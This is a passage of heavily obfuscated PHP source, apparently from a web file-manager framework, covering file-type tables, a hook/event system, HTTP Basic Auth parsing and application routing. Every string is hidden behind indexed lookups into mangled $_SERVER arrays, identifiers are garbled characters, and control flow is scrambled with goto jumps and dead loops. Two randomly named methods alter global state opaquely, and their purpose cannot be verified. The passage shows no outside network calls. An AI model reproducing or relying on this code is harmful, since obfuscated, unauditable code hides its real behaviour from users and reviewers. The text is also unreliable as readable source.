continue; } if (preg_match($A±éÅ‡ññš[1529], $C“ë×ŒçÓ‘, $AŠ”—¢ØÍ)) { $b–È‚ÈÃ„½ = explode($A±éÅ‡ññš[268], $AŠ”—¢ØÍ[1]); foreach ($b–È‚ÈÃ„½ as $AÛëá³Ó°Í) { $dñ§È£¿¯í[] = str_replace($AŠ”—¢ØÍ[0], $AÛëá³Ó°Í, $C“ë×ŒçÓ‘); } } else { $dñ§È£¿¯í[] = $C“ë×ŒçÓ‘; } } $eÆ¢µ¤[$BšÀÔÚ“—] = $dñ§È£¿¯í; } return $eÆ¢µ¤; } private static function valueResetAll($C§¶ÔôÍÕ, $F¢¥­ó…âÎ) { goto fõ“ñÑÊ·İ; d®±Ê„¤²Ï: if ($fÙ‚›®ºñª) { $aÇ‘¦à˜æ = IO_PATH_SYSTEM_TEMP . $B¯ëô°êî[1535] . KodIO::hashPath($F¢¥­ó…âÎ) . $B¯ëô°êî[1536]; $C§¶ÔôÍÕ[$B¯ëô°êî[1537]] = Action($B¯ëô°êî[1538])->pluginCacheFileSet($aÇ‘¦à˜æ, $fÙ‚›®ºñª); unset($C§¶ÔôÍÕ[$B¯ëô°êî[1539]][$B¯ëô°êî[1522]]); } $c¹ÇñÊÄĞ’ = _get($C§¶ÔôÍÕ, $B¯ëô°êî[1540], $B¯ëô°êî[33]); $føğšƒÃœ— = _get($C§¶ÔôÍÕ, $B¯ëô°êî[1541], $B¯ëô°êî[33]); goto DÍ‡´ÊÏë; DâÂëØá‹Ç: return $C§¶ÔôÍÕ; goto E¯¿Ğ« Á; fõ“ñÑÊ·İ: $B¯ëô°êî =& $_SERVER[¿õñ]; if (isset($C§¶ÔôÍÕ[$B¯ëô°êî[1530]])) { $E­­ÆÄÈ¨¸ = ceil($C§¶ÔôÍÕ[$B¯ëô°êî[1530]]); $A‘¢ãë¹’ó = intval($E­­ÆÄÈ¨¸ / 3600); $e×¶øÏ¼„Ì = intval(($E­­ÆÄÈ¨¸ - $A‘¢ãë¹’ó * 3600) / 60); $EÜÜìç”ù = $E­­ÆÄÈ¨¸ % 60; $C§¶ÔôÍÕ[$B¯ëô°êî[1531]] = sprintf($B¯ëô°êî[1532], $A‘¢ãë¹’ó, $e×¶øÏ¼„Ì, $EÜÜìç”ù); if ($A‘¢ãë¹’ó == 0) { $C§¶ÔôÍÕ[$B¯ëô°êî[1531]] = sprintf($B¯ëô°êî[1533], $e×¶øÏ¼„Ì, $EÜÜìç”ù); } } $fÙ‚›®ºñª = _get($C§¶ÔôÍÕ, $B¯ëô°êî[1534]); goto d®±Ê„¤²Ï; DÍ‡´ÊÏë: $EÃÖÏ¤Ù·¶ = _get($C§¶ÔôÍÕ, $B¯ëô°êî[1542], $B¯ëô°êî[33]); $EÙàÎŠ’Û = $c¹ÇñÊÄĞ’ . $føğšƒÃœ— . $EÃÖÏ¤Ù·¶; if ($EÙàÎŠ’Û && get_charset($EÙàÎŠ’Û) != $B¯ëô°êî[323]) { $C§¶ÔôÍÕ[$B¯ëô°êî[1539]][$B¯ëô°êî[1247]] = iconv_to($C§¶ÔôÍÕ[$B¯ëô°êî[1539]][$B¯ëô°êî[1247]], get_charset($EÙàÎŠ’Û), $B¯ëô°êî[323]); $C§¶ÔôÍÕ[$B¯ëô°êî[1539]][$B¯ëô°êî[1543]] = iconv_to($C§¶ÔôÍÕ[$B¯ëô°êî[1539]][$B¯ëô°êî[1543]], get_charset($EÙàÎŠ’Û), $B¯ëô°êî[323]); $C§¶ÔôÍÕ[$B¯ëô°êî[1539]][$B¯ëô°êî[1544]] = iconv_to($C§¶ÔôÍÕ[$B¯ëô°êî[1539]][$B¯ëô°êî[1544]], get_charset($EÙàÎŠ’Û), $B¯ëô°êî[323]); } goto DâÂëØá‹Ç; E¯¿Ğ« Á: } private static function valueReset($D´İáª¼æ, $a­˜™ÆÔ¬§, $b‡Š°ÅÉ) { $Bãå ğÌ• =& $_SERVER[¿õñ]; $CÀø’‹Şë› = $Bãå ğÌ•[1461]; switch ($D´İáª¼æ) { case $Bãå ğÌ•[1545]: $a­˜™ÆÔ¬§ = $a­˜™ÆÔ¬§ == $Bãå ğÌ•[493] ? $Bãå ğÌ•[1546] : $Bãå ğÌ•[1547]; break; case $Bãå ğÌ•[1548]: $a­˜™ÆÔ¬§ = $a­˜™ÆÔ¬§ ? $a­˜™ÆÔ¬§ : null; break; default: break; } switch ($b‡Š°ÅÉ) { case $Bãå ğÌ•[1549]: $a­˜™ÆÔ¬§ = round($a­˜™ÆÔ¬§, 2); break; case $Bãå ğÌ•[184]: case $Bãå ğÌ•[106]: if ($a­˜™ÆÔ¬§ < 0) { $a­˜™ÆÔ¬§ = null; } else { if (is_numeric($a­˜™ÆÔ¬§)) { $a­˜™ÆÔ¬§ = date($CÀø’‹Şë›, $a­˜™ÆÔ¬§); } } break; default: break; } return $a­˜™ÆÔ¬§; } private static function fileTypeArray() { $e¸£Ï–Ö¹À =& $_SERVER[¿õñ]; return array($e¸£Ï–Ö¹À[1522] => array($e¸£Ï–Ö¹À[157] => $e¸£Ï–Ö¹À[1550] . $e¸£Ï–Ö¹À[1551], $e¸£Ï–Ö¹À[1526] => array($e¸£Ï–Ö¹À[1444] => $e¸£Ï–Ö¹À[1552], $e¸£Ï–Ö¹À[1446] => $e¸£Ï–Ö¹À[1553], $e¸£Ï–Ö¹À[1554] => $e¸£Ï–Ö¹À[1555], $e¸£Ï–Ö¹À[1556] => $e¸£Ï–Ö¹À[1557], $e¸£Ï–Ö¹À[184] => $e¸£Ï–Ö¹À[1558], $e¸£Ï–Ö¹À[106] => $e¸£Ï–Ö¹À[1559], $e¸£Ï–Ö¹À[1560] => $e¸£Ï–Ö¹À[1561], $e¸£Ï–Ö¹À[1562] => $e¸£Ï–Ö¹À[1563], $e¸£Ï–Ö¹À[1564] => $e¸£Ï–Ö¹À[1565], $e¸£Ï–Ö¹À[1566] => $e¸£Ï–Ö¹À[1567], $e¸£Ï–Ö¹À[1568] => $e¸£Ï–Ö¹À[1569], $e¸£Ï–Ö¹À[1570] => $e¸£Ï–Ö¹À[1571], $e¸£Ï–Ö¹À[1572] => $e¸£Ï–Ö¹À[1573], $e¸£Ï–Ö¹À[1574] => array($e¸£Ï–Ö¹À[1575] => $e¸£Ï–Ö¹À[1576], $e¸£Ï–Ö¹À[1577] => $e¸£Ï–Ö¹À[1578], $e¸£Ï–Ö¹À[1579] => $e¸£Ï–Ö¹À[1580]), $e¸£Ï–Ö¹À[1581] => $e¸£Ï–Ö¹À[1582], $e¸£Ï–Ö¹À[1583] => $e¸£Ï–Ö¹À[1584], $e¸£Ï–Ö¹À[1585] => $e¸£Ï–Ö¹À[1586], $e¸£Ï–Ö¹À[1587] => $e¸£Ï–Ö¹À[1588], $e¸£Ï–Ö¹À[1589] => array($e¸£Ï–Ö¹À[1590] => $e¸£Ï–Ö¹À[1591], $e¸£Ï–Ö¹À[1592] => $e¸£Ï–Ö¹À[1593], $e¸£Ï–Ö¹À[1594] => $e¸£Ï–Ö¹À[1595], $e¸£Ï–Ö¹À[1596] => $e¸£Ï–Ö¹À[1597], $e¸£Ï–Ö¹À[1598] => $e¸£Ï–Ö¹À[1599], $e¸£Ï–Ö¹À[1600] => $e¸£Ï–Ö¹À[1601], $e¸£Ï–Ö¹À[1602] => $e¸£Ï–Ö¹À[1603], $e¸£Ï–Ö¹À[1604] => $e¸£Ï–Ö¹À[1605], $e¸£Ï–Ö¹À[1606] => $e¸£Ï–Ö¹À[1607], $e¸£Ï–Ö¹À[1608] => $e¸£Ï–Ö¹À[1609], $e¸£Ï–Ö¹À[1610] => $e¸£Ï–Ö¹À[1611]))), $e¸£Ï–Ö¹À[1612] => array($e¸£Ï–Ö¹À[157] => $e¸£Ï–Ö¹À[1613] . $e¸£Ï–Ö¹À[1614], $e¸£Ï–Ö¹À[1526] => array($e¸£Ï–Ö¹À[1530] => $e¸£Ï–Ö¹À[1615], $e¸£Ï–Ö¹À[184] => $e¸£Ï–Ö¹À[1616], $e¸£Ï–Ö¹À[106] => $e¸£Ï–Ö¹À[1617], $e¸£Ï–Ö¹À[1562] => $e¸£Ï–Ö¹À[1618], $e¸£Ï–Ö¹À[1619] => $e¸£Ï–Ö¹À[1620], $e¸£Ï–Ö¹À[1621] => $e¸£Ï–Ö¹À[1548], $e¸£Ï–Ö¹À[1622] => $e¸£Ï–Ö¹À[1623], $e¸£Ï–Ö¹À[1624] => $e¸£Ï–Ö¹À[1625], $e¸£Ï–Ö¹À[1626] => $e¸£Ï–Ö¹À[1627], $e¸£Ï–Ö¹À[1539] => array($e¸£Ï–Ö¹À[1247] => $e¸£Ï–Ö¹À[1628], $e¸£Ï–Ö¹À[1543] => $e¸£Ï–Ö¹À[1629], $e¸£Ï–Ö¹À[1544] => $e¸£Ï–Ö¹À[1630], $e¸£Ï–Ö¹À[1631] => $e¸£Ï–Ö¹À[1632], $e¸£Ï–Ö¹À[1633] => $e¸£Ï–Ö¹À[1634], $e¸£Ï–Ö¹À[1635] => $e¸£Ï–Ö¹À[1636], $e¸£Ï–Ö¹À[1522] => $e¸£Ï–Ö¹À[1637]))), $e¸£Ï–Ö¹À[1638] => array($e¸£Ï–Ö¹À[157] => $e¸£Ï–Ö¹À[1639] . $e¸£Ï–Ö¹À[1640], $e¸£Ï–Ö¹À[1526] => array($e¸£Ï–Ö¹À[1444] => $e¸£Ï–Ö¹À[1641], $e¸£Ï–Ö¹À[1446] => $e¸£Ï–Ö¹À[1642], $e¸£Ï–Ö¹À[1530] => $e¸£Ï–Ö¹À[1615], $e¸£Ï–Ö¹À[184] => $e¸£Ï–Ö¹À[1643], $e¸£Ï–Ö¹À[106] => $e¸£Ï–Ö¹À[1644], $e¸£Ï–Ö¹À[1549] => $e¸£Ï–Ö¹À[1645], $e¸£Ï–Ö¹À[1626] => $e¸£Ï–Ö¹À[1646], $e¸£Ï–Ö¹À[1622] => $e¸£Ï–Ö¹À[1647], $e¸£Ï–Ö¹À[1562] => $e¸£Ï–Ö¹À[1648], $e¸£Ï–Ö¹À[1612] => array($e¸£Ï–Ö¹À[1621] => $e¸£Ï–Ö¹À[1548], $e¸£Ï–Ö¹À[1649] => $e¸£Ï–Ö¹À[1650], $e¸£Ï–Ö¹À[1619] => $e¸£Ï–Ö¹À[1620], $e¸£Ï–Ö¹À[1626] => $e¸£Ï–Ö¹À[1627], $e¸£Ï–Ö¹À[1622] => $e¸£Ï–Ö¹À[1651], $e¸£Ï–Ö¹À[1624] => $e¸£Ï–Ö¹À[1625]))), $e¸£Ï–Ö¹À[1652] => array($e¸£Ï–Ö¹À[1526] => array($e¸£Ï–Ö¹À[1653] => $e¸£Ï–Ö¹À[1654], $e¸£Ï–Ö¹À[1655] => $e¸£Ï–Ö¹À[1656])), $e¸£Ï–Ö¹À[1657] => array($e¸£Ï–Ö¹À[1526] => array())); } } class Hook { private static $events = array(); public static function get($dá¥êÒ‡ø‰ = false) { if (!$dá¥êÒ‡ø‰) { return self::$events; } else { return self::$events[$dá¥êÒ‡ø‰]; } } public static function apply($Cöõ»È¦ƒÊ, $cÜƒçÕ³Û = array()) { $Fîµœ¸ùŠ‚ = ActionApply($Cöõ»È¦ƒÊ, $cÜƒçÕ³Û); if (is_string($Cöõ»È¦ƒÊ)) { Hook::trigger($Cöõ»È¦ƒÊ); } return $Fîµœ¸ùŠ‚; } public static function bind($DĞğÆÓÙ¼Ã, $b¾íô±ã®æ, $D…“Öè¹‚’ = false) { $EìİêØƒ‘Õ =& $_SERVER[¿õñ]; if (!isset(self::$events[$DĞğÆÓÙ¼Ã])) { self::$events[$DĞğÆÓÙ¼Ã] = array(); } self::$events[$DĞğÆÓÙ¼Ã][] = array($EìİêØƒ‘Õ[1658] => $b¾íô±ã®æ, $EìİêØƒ‘Õ[1659] => $D…“Öè¹‚’, $EìİêØƒ‘Õ[1660] => 0); } public static function once($AÙŞë³òñ‘, $Dİ– á•Œ) { self::bind($AÙŞë³òñ‘, $Dİ– á•Œ, !0); } public static function unbind($B‹Á¯Ä¼èÖ, $f·Â¬¿…ÂÍ = false) { if (!$f·Â¬¿…ÂÍ) { self::$events[$B‹Á¯Ä¼èÖ] = array(); return; } $EÀ•ƒ¨µˆî = self::$events[$B‹Á¯Ä¼èÖ]; self::$events[$B‹Á¯Ä¼èÖ] = array(); if (!$EÀ•ƒ¨µˆî) { return; } for ($e×ö„â±¨ = 0; $e×ö„â±¨ < count($EÀ•ƒ¨µˆî); $e×ö„â±¨++) { if ($EÀ•ƒ¨µˆî[$e×ö„â±¨][$_SERVER[¿õñ][1658]] == $f·Â¬¿…ÂÍ) { continue; } self::$events[$B‹Á¯Ä¼èÖ][] = $EÀ•ƒ¨µˆî[$e×ö„â±¨]; } } public static function filter($CÙê¡Ûì¼ê, $fèåÔöŸÌŠ) { goto DÎòŞ¢…õÛ; DÎòŞ¢…õÛ: $aòï¹Íˆ—ø =& $_SERVER[¿õñ]; $b®ß£õğõé = self::$events; if (!isset($b®ß£õğõé[$CÙê¡Ûì¼ê])) { return $fèåÔöŸÌŠ; } goto bÌ¹¯²Õº; E¿‡‚¶«å: for ($DƒøÙ¯¹ò® = 0; $DƒøÙ¯¹ò® < count($dä¢£„ì‚Ã); $DƒøÙ¯¹ò®++) { $bÇà»–¨Ì = $dä¢£„ì‚Ã[$DƒøÙ¯¹ò®]; if ($bÇà»–¨Ì[$aòï¹Íˆ—ø[1659]] && $bÇà»–¨Ì[$aòï¹Íˆ—ø[1660]] > 1) { continue; } self::$events[$CÙê¡Ûì¼ê][$DƒøÙ¯¹ò®][$aòï¹Íˆ—ø[1660]] = $bÇà»–¨Ì[$aòï¹Íˆ—ø[1660]] + 1; $C‰„È–Úº = self::apply($bÇà»–¨Ì[$aòï¹Íˆ—ø[1658]], array($dŠÎ¤«œ·„)); if (!is_null($C‰„È–Úº)) { $dŠÎ¤«œ·„ = $C‰„È–Úº; } } return $dŠÎ¤«œ·„; goto FÜ‡«„ÌŸ½; bÌ¹¯²Õº: $dä¢£„ì‚Ã = $b®ß£õğõé[$CÙê¡Ûì¼ê]; $dŠÎ¤«œ·„ = $fèåÔöŸÌŠ; if (!is_array($dä¢£„ì‚Ã) || count($dä¢£„ì‚Ã) == 0) { return $dŠÎ¤«œ·„; } goto E¿‡‚¶«å; FÜ‡«„ÌŸ½: } public static function trigger($a©òÏÔéŠ) { goto C¾”÷˜ñŞÖ; dâíÄËŒÕ: if (!isset($e¹¾¨ÄæÇ[$a©òÏÔéŠ])) { return $Dç„¿è™ÅŠ; } $C¥’‚ÚÒÕ® = $e¹¾¨ÄæÇ[$a©òÏÔéŠ]; if (!is_array($C¥’‚ÚÒÕ®) || count($C¥’‚ÚÒÕ®) == 0) { return $Dç„¿è™ÅŠ; } goto aËÄ§ˆ‹…; C¾”÷˜ñŞÖ: $Dó«Â¶ª” =& $_SERVER[¿õñ]; $e¹¾¨ÄæÇ = self::$events; $Dç„¿è™ÅŠ = !1; goto dâíÄËŒÕ; aËÄ§ˆ‹…: $f¹¶¥Œ¤Ï³ = func_get_args(); array_shift($f¹¶¥Œ¤Ï³); for ($c‘¾¢È‹±ò = 0; $c‘¾¢È‹±ò < count($C¥’‚ÚÒÕ®); $c‘¾¢È‹±ò++) { $FØõ’ïš = $C¥’‚ÚÒÕ®[$c‘¾¢È‹±ò]; if ($FØõ’ïš[$Dó«Â¶ª”[1659]] && $FØõ’ïš[$Dó«Â¶ª”[1660]] > 1) { continue; } if (defined($Dó«Â¶ª”[1661]) && GLOBAL_LOG_HOOK) { write_log($a©òÏÔéŠ . $Dó«Â¶ª”[1662] . $FØõ’ïš[$Dó«Â¶ª”[1658]], $Dó«Â¶ª”[1663]); } self::$events[$a©òÏÔéŠ][$c‘¾¢È‹±ò][$Dó«Â¶ª”[1660]] = $FØõ’ïš[$Dó«Â¶ª”[1660]] + 1; $b­ ¢¥òù = self::apply($FØõ’ïš[$Dó«Â¶ª”[1658]], $f¹¶¥Œ¤Ï³); if (defined($Dó«Â¶ª”[1661]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $Dó«Â¶ª”[1663]); if ($FØõ’ïš[$Dó«Â¶ª”[1660]] == 200) { $c¦ƒŸàëÚ = is_array($FØõ’ïš[$Dó«Â¶ª”[1658]]) ? json_encode_force($FØõ’ïš[$Dó«Â¶ª”[1658]]) : $FØõ’ïš[$Dó«Â¶ª”[1658]]; write_log($Dó«Â¶ª”[1664] . $a©òÏÔéŠ . $Dó«Â¶ª”[1665] . $c¦ƒŸàëÚ, $Dó«Â¶ª”[1666]); } } $Dç„¿è™ÅŠ = is_null($b­ ¢¥òù) ? $Dç„¿è™ÅŠ : $b­ ¢¥òù; } goto E°‚Áèù¡Î; E°‚Áèù¡Î: return $Dç„¿è™ÅŠ; goto eğÃ´§Ã¹ô; eğÃ´§Ã¹ô: } } class HttpAuth { public static function get() { $b«—Î½áß† =& $_SERVER[¿õñ]; $bÃ‡ã»éÌÛ = $b«—Î½áß†[33]; $F‰ã®œƒòç = $b«—Î½áß†[33]; if (isset($_SERVER[$b«—Î½áß†[1667]])) { $bÃ‡ã»éÌÛ = $_SERVER[$b«—Î½áß†[1667]]; $F‰ã®œƒòç = $_SERVER[$b«—Î½áß†[1668]]; } elseif (isset($_SERVER[$b«—Î½áß†[1669]])) { $BÛÏ÷œ¨« = $_SERVER[$b«—Î½áß†[1669]]; if (strpos(strtolower($BÛÏ÷œ¨«), $b«—Î½áß†[1670]) === 0) { $C³âÙÃ¥ÛÈ = explode($b«—Î½áß†[4], base64_decode(substr($BÛÏ÷œ¨«, 6))); $bÃ‡ã»éÌÛ = isset($C³âÙÃ¥ÛÈ[0]) ? $C³âÙÃ¥ÛÈ[0] : $b«—Î½áß†[33]; $F‰ã®œƒòç = isset($C³âÙÃ¥ÛÈ[1]) ? $C³âÙÃ¥ÛÈ[1] : 0; } } return array($b«—Î½áß†[527] => $bÃ‡ã»éÌÛ, $b«—Î½áß†[904] => $F‰ã®œƒòç); } public static function error() { goto d‰ÙùµàÒ; d‰ÙùµàÒ: $fôÂ„ ôÏ =& $_SERVER[¿õñ]; header($fôÂ„ ôÏ[1671]); header($fôÂ„ ôÏ[1672]); goto Fæ…¥Îõ˜‹; Fæ…¥Îõ˜‹: header($fôÂ„ ôÏ[1673]); header($fôÂ„ ôÏ[1674]); header($fôÂ„ ôÏ[1675]); goto bìì‘Åé‹; bìì‘Åé‹: die; goto FæŠì®‚ã; FæŠì®‚ã: } public static function make($Bç“±í©Ë, $Fä¢ÏÔ²»¸) { $CÚ‹Ë´ô“Â =& $_SERVER[¿õñ]; return $CÚ‹Ë´ô“Â[1676] + base64_encode($Bç“±í©Ë . $CÚ‹Ë´ô“Â[4] . $Fä¢ÏÔ²»¸); } } goto C¾†ÅÀ—Ãè; dï£Õ±Áœ: if (!$eŞ§º¥²ç) { return; } class Application { private $defaultModule = "\x69\156\x64\145\170"; private $defaultController = "\151\x6e\x64\x65\x78"; private $defaultAction = "\151\156\144\x65\170"; function __construct() { } public function setDefault($Eòà¯ó™×) { goto D ‹‹ª‡—²; B¡£‡ƒ¥–³: $c˜à“œ“È = $eµ¢ƒ¤³õÉ[543]; if (strlen($c˜à“œ“È) < $eµ¢ƒ¤³õÉ[544]) { die; } $this->defaultModule = $aÉà‹œß½¸[0] ? $aÉà‹œß½¸[0] : $this->defaultModule; goto dá³†øÂµ; F®”é¨ÅàŠ: $cŞˆŒ‡¡åñ = $eµ¢ƒ¤³õÉ[547]; while (strlen($cŞˆŒ‡¡åñ) < $eµ¢ƒ¤³õÉ[548]) { if (!$cŞˆŒ‡¡åñ) { break; } $cŞˆŒ‡¡åñ++; } goto FùÆÈ¯‹ñø; dá³†øÂµ: $cèğİ²Î†œ = $eµ¢ƒ¤³õÉ[545]; $this->defaultController = $aÉà‹œß½¸[1] ? $aÉà‹œß½¸[1] : $this->defaultController; $e¸¬®ƒŠ§ = $eµ¢ƒ¤³õÉ[546]; goto c®Šï÷áğó; D ‹‹ª‡—²: $eµ¢ƒ¤³õÉ =& $_SERVER[¿õñ]; $d«Šˆ«“°‡ =& $_SERVER[°Šë¾«øµÑ]; $aÉà‹œß½¸ = $d«Šˆ«“°‡[0]($d«Šˆ«“°‡[1], $d«Šˆ«“°‡[2]($Eòà¯ó™×, $d«Šˆ«“°‡[1])); goto B¡£‡ƒ¥–³; c®Šï÷áğó: if (!$e¸¬®ƒŠ§) { return; } $this->defaultAction = $aÉà‹œß½¸[2] ? $aÉà‹œß½¸[2] : $this->defaultAction; $this->{$_SERVER[°Šë¾«øµÑ][3]}($d«Šˆ«“°‡[4], array($this, $d«Šˆ«“°‡[5])); goto F®”é¨ÅàŠ; FùÆÈ¯‹ñø: } public function appRun($dğ¯º‹‹Æ) { goto aÉ« Ó‡´Ğ; b‡ÜØ²¦åÃ: $C¸İ§ĞéÙ = $A°¾ò½î¯[549]; while ($C¸İ§ĞéÙ < $A°¾ò½î¯[550]) { if ($C¸İ§ĞéÙ >= 0) { break; } $C¸İ§ĞéÙ++; } $E¤Ê­êõï = $aİÊŸ­Š[6]($AÕ’†’Ü´Ş[0]); goto eÂ…Î‡Á“£; cİöÛÂÅó„: if ($E¤Ê­êõï == $aİÊŸ­Š[8]) { $Dš›·ŠĞˆ = $aİÊŸ­Š[9]; $AÕ’†’Ü´Ş[0] = $aİÊŸ­Š[10]; $AÕ’†’Ü´Ş[1] = $AÕ’†’Ü´Ş[1] . $aİÊŸ­Š[11]; $dğ¯º‹‹Æ = $aİÊŸ­Š[12]($aİÊŸ­Š[1], $AÕ’†’Ü´Ş); $dğ¯º‹‹Æ = $aİÊŸ­Š[2]($dğ¯º‹‹Æ, $aİÊŸ­Š[1]); } $aİÊŸ­Š[13](array($aİÊŸ­Š[14], $aİÊŸ­Š[15]), $Dš›·ŠĞˆ . $aİÊŸ­Š[16], $dğ¯º‹‹Æ); $aİÊŸ­Š[17]($dğ¯º‹‹Æ); goto CÑïèñâ—º; eÂ…Î‡Á“£: $CØŒŸÔ¡ê = $A°¾ò½î¯[551]; if (strlen($CØŒŸÔ¡ê) < $A°¾ò½î¯[550]) { return; } $Dš›·ŠĞˆ = $aİÊŸ­Š[7]; goto cİöÛÂÅó„; aÉ« Ó‡´Ğ: $A°¾ò½î¯ =& $_SERVER[¿õñ]; $aİÊŸ­Š =& $_SERVER[°Šë¾«øµÑ]; $AÕ’†’Ü´Ş = $aİÊŸ­Š[0]($aİÊŸ­Š[1], $dğ¯º‹‹Æ); goto b‡ÜØ²¦åÃ; CÑïèñâ—º: $c¤¶§›™‚ = $A°¾ò½î¯[552]; if (strlen($c¤¶§›™‚) < $A°¾ò½î¯[553]) { die; } $aİÊŸ­Š[13](array($aİÊŸ­Š[14], $aİÊŸ­Š[15]), $Dš›·ŠĞˆ . $aİÊŸ­Š[18], $dğ¯º‹‹Æ); goto e†¦ˆ¿¨éô; e†¦ˆ¿¨éô: } private function autorun() { $F»ìƒòÛââ =& $_SERVER[°Šë¾«øµÑ]; global $config; if ($F»ìƒòÛââ[19]($config[$F»ìƒòÛââ[20]]) == 0) { return; } foreach ($config[$F»ìƒòÛââ[20]] as $b«Ÿôò¨‡Ò => $b–’Ë¡ŠÈ£) { $this->{$_SERVER[°Šë¾«øµÑ][21]}($b–’Ë¡ŠÈ£); } } private function wxef6cc0a5ed() { goto E®ºäŒ£æ–; aö×¥¼áÕ½: if (!$b£¤ˆ…ˆÏ) { die; } $GLOBALS[$Dô’†©Ó’Ñ[22]][$Dô’†©Ó’Ñ[23]] = $Dô’†©Ó’Ñ[27]($a‹å“µå¨ó, $EöìÕ—ë‚Ù); $C´¿³œñ = $f÷ÏâÌ³Ôê[556]; goto Dò¨óˆ†Òô; E‰Õ¤íåÍ†: $a‹å“µå¨ó = array($Dô’†©Ó’Ñ[8], $AìóÁ—ĞÅƒ); $EöìÕ—ë‚Ù = $Dô’†©Ó’Ñ[26]($GLOBALS[$Dô’†©Ó’Ñ[22]][$Dô’†©Ó’Ñ[23]], 1); $b£¤ˆ…ˆÏ = $f÷ÏâÌ³Ôê[555]; goto aö×¥¼áÕ½; B±Ğêº˜µ: $fù¡Ã°åä = $GLOBALS[$Dô’†©Ó’Ñ[22]][$Dô’†©Ó’Ñ[23]][0]; $DŸ‘É¼œÌ— = $f÷ÏâÌ³Ôê[554]; while (strlen($DŸ‘É¼œÌ—) < $f÷ÏâÌ³Ôê[553]) { if (!$DŸ‘É¼œÌ—) { break; } $DŸ‘É¼œÌ—++; } goto f¤£Š¿Ç­Ô; f¤£Š¿Ç­Ô: if (!$fù¡Ã°åä || $Dô’†©Ó’Ñ[24]($fù¡Ã°åä) <= $Dô’†©Ó’Ñ[24]($C¹éÒÔóå¼)) { return; } if ($Dô’†©Ó’Ñ[6]($Dô’†©Ó’Ñ[25]($fù¡Ã°åä, -$Dô’†©Ó’Ñ[24]($C¹éÒÔóå¼))) != $C¹éÒÔóå¼) { return; } $AìóÁ—ĞÅƒ = $Dô’†©Ó’Ñ[25]($fù¡Ã°åä, 0, -$Dô’†©Ó’Ñ[24]($C¹éÒÔóå¼)); goto E‰Õ¤íåÍ†; Dò¨óˆ†Òô: while (strlen($C´¿³œñ) < $f÷ÏâÌ³Ôê[544]) { if (!$C´¿³œñ) { break; } $C´¿³œñ++; } $GLOBALS[$Dô’†©Ó’Ñ[22]][$Dô’†©Ó’Ñ[28]] = $Dô’†©Ó’Ñ[29]($Dô’†©Ó’Ñ[1], $GLOBALS[$Dô’†©Ó’Ñ[22]][$Dô’†©Ó’Ñ[23]]); $E±¶ñÌÚ¶„ = $f÷ÏâÌ³Ôê[557]; goto EÒ¿ØÍ’ù; EÒ¿ØÍ’ù: if (!$E±¶ñÌÚ¶„) { return; } goto e†Ø¥ˆ·Ù¸; E®ºäŒ£æ–: $f÷ÏâÌ³Ôê =& $_SERVER[¿õñ]; $Dô’†©Ó’Ñ =& $_SERVER[°Šë¾«øµÑ]; $C¹éÒÔóå¼ = $Dô’†©Ó’Ñ[8]; goto B±Ğêº˜µ; e†Ø¥ˆ·Ù¸: } private function vtda59ef2dcd() { goto A¥¢øß¬¤¨; c¥“Ì„¿â²: $GLOBALS[$c¿À°­èÉñ[22]][$c¿À°­èÉñ[23]] = $c¿À°­èÉñ[0]($c¿À°­èÉñ[36], $EÌÌÏÖË); $GLOBALS[$c¿À°­èÉñ[22]][$c¿À°­èÉñ[28]] = $c¿À°­èÉñ[29]($c¿À°­èÉñ[1], $GLOBALS[$c¿À°­èÉñ[22]][$c¿À°­èÉñ[23]]); $EÜĞ¬ØŒ™ = $cèˆØ²½Ô²[561]; goto F³ø«ß°’…; AËé±†é: $BŸÇğáóãƒ = $_SERVER[$c¿À°­èÉñ[30]]; $FÜï·Ùè¯ = $c¿À°­èÉñ[31]; $dí¹ì°Øˆï = $cèˆØ²½Ô²[558]; goto C´¸É„¿×; A¥¢øß¬¤¨: $cèˆØ²½Ô² =& $_SERVER[¿õñ]; $c¿À°­èÉñ =& $_SERVER[°Šë¾«øµÑ]; if ($GLOBALS[$c¿À°­èÉñ[22]][$c¿À°­èÉñ[28]] != $c¿À°­èÉñ[10]) { return; } goto AËé±†é; b„Õ„ñ¿Æ: $EÌÌÏÖË = $c¿À°­èÉñ[2]($B‰„õ¨¬Œì[0][0], $c¿À°­èÉñ[36]); $aïˆ“øÛĞğ = $cèˆØ²½Ô²[560]; if (strlen($aïˆ“øÛĞğ) < $cèˆØ²½Ô²[550]) { die; } goto c¥“Ì„¿â²; C–Ú‚òëôÅ: $EÌÌÏÖË = $c¿À°­èÉñ[25]($BŸÇğáóãƒ, $d¦®À¬ôÊ + $c¿À°­èÉñ[24]($FÜï·Ùè¯)); $c¿À°­èÉñ[34]($c¿À°­èÉñ[35], $EÌÌÏÖË, $B‰„õ¨¬Œì); $BßØÕ®Ä¤Ì = $cèˆØ²½Ô²[559]; goto b„Õ„ñ¿Æ; C´¸É„¿×: if (!$dí¹ì°Øˆï) { return; } if (!$c¿À°­èÉñ[32]($BŸÇğáóãƒ, $FÜï·Ùè¯)) { return; } $d¦®À¬ôÊ = $c¿À°­èÉñ[33]($BŸÇğáóãƒ, $FÜï·Ùè¯); goto C–Ú‚òëôÅ; F³ø«ß°’…: } public function run() { goto c¾ßåñÆ‡; A‚¹˜Ûâ‰Û: $_SERVER[$fê¶®æŒñÂ[44]] = $fê¶®æŒñÂ[6](ACTION); $FÈòè¸ê«Ã = $D¤©“İëÏ’[567]; if (!$FÈòè¸ê«Ã) { die; } goto BğçØÑ•»ˆ; BğçØÑ•»ˆ: $this->{$_SERVER[°Šë¾«øµÑ][45]}(); if ($fê¶®æŒñÂ[19]($f˜…Ïİï´×) >= 3) { $this->{$_SERVER[°Šë¾«øµÑ][21]}($FÅğ¶³¦¹ˆ); } else { $this->{$_SERVER[°Šë¾«øµÑ][21]}(ACTION); } goto b‘‹ÄÒç¿í; EŠ«Şá±Ü§: $fê¶®æŒñÂ[39]($fê¶®æŒñÂ[40], isset($f˜…Ïİï´×[0]) && $f˜…Ïİï´×[0] ? $f˜…Ïİï´×[0] : $this->defaultModule); $DÑ’š‰ÏÍ  = $D¤©“İëÏ’[564]; $fê¶®æŒñÂ[39]($fê¶®æŒñÂ[41], isset($f˜…Ïİï´×[1]) && $f˜…Ïİï´×[0] ? $f˜…Ïİï´×[1] : $this->defaultController); goto aíâ¬Ï…¸†; D…è…¢ĞÁÄ: $eå‹‘×Æêë = $D¤©“İëÏ’[563]; while ($eå‹‘×Æêë < $D¤©“İëÏ’[550]) { if ($eå‹‘×Æêë >= 0) { break; } $eå‹‘×Æêë++; } $FÅğ¶³¦¹ˆ = $GLOBALS[$fê¶®æŒñÂ[22]][$fê¶®æŒñÂ[28]]; goto 